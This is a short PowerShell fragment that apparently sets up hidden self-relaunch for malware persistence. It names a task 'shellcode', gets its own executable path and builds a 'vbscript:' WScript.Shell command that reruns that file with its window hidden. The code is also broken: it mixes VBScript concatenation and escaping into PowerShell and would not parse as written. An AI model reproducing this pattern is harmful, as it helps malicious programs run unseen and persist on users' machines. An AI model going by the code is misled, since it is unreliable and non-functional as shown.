$task_name = "shellcode"
$file_path = (Get-Process -Id $pid).Path
$script_check = "vbscript:CreateObject(\"WScript.Shell\").Run \"" & $file_path & "\", 0, False"
